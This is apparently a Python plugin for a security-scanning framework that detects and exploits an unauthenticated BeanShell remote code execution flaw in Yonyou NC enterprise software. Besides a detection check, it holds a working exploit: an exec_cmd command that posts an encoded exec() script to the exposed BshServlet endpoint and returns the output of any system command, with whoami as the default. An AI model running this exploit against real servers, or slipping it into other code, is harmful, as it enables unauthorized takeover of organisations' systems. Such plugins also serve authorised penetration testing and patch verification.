# -*-* coding:UTF-8
import urllib.parse


class Plugin(Base):
    __info__ = {
        "name": "用友NC BeanShell远程代码执行漏洞",
        "description": "用友NC是面向集团企业的管理软件，其在同类市场占有率中达到亚太第一。该漏洞是由于用友NC对外开放了BeanShell接口，攻击者可以在未授权的情况下直接访问该接口，并构造恶意数据执行任意代码并获取服务器权限",
        "references": ["-"],
    }

    def __condition__(self):
        return self.condition(
            matches=[
                {
                    "search": "body",
                    "keyword": "用友NC"
                }
            ]
        )

    def url(self) -> dict:
        r = self.request(
            method='post',
            path='./servlet/~ic/bsh.servlet.BshServlet',
            headers={
                'Content-Type': 'application/x-www-form-urlencoded'
            }
        )
        if r.status_code == 200 and 'BeanShell Test Servlet' in r.text:
            return {"LoopholeInfo": self.__info__}

    @cli.command(description='执行系统命令')
    @cli.options("url", help="攻击的目标", default="{self.target.value}")
    @cli.options("cmd", help="执行的命令", default="whoami")
    def exec_cmd(self, url, cmd):
        pat = urllib.parse.quote(f'exec("{cmd}");')
        r = self.request(
            method='post',
            url=urllib.parse.urljoin(url, './servlet/~ic/bsh.servlet.BshServlet'),
            headers={
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            timeout=15,
            data=f'bsh.script={pat}%0D%0A%0D%0A%0D%0A%0D%0A&bsh.servlet.output=raw'
        )
        if r.status_code == 200:
            return r.text
